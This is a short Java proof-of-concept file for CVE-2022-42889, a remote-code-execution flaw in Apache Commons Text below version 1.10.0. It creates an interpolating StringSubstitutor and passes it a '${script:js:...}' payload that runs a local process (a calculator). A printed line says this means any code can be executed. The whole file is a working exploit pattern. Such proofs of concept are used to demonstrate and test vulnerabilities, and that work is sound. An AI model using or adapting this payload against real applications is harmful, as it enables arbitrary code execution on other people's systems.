package org.nauman;

import org.apache.commons.text.StringSubstitutor;

/**
 * @author naumanshah03
 * https://seclists.org/oss-sec/2022/q4/22 - CVE-2022-42889
 */

public class Main {
    public static void main(String[] args) {
        System.out.println("Welcome to the POC of RCE on Apache Commons Text below 1.10.0");
        StringSubstitutor stringSubstitutorInterpolator = StringSubstitutor.createInterpolator();
        String payload = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";
        stringSubstitutorInterpolator.replace(payload);
        System.out.println("The above payload will start a Calculator hence we can execute any code we want");
    }
}
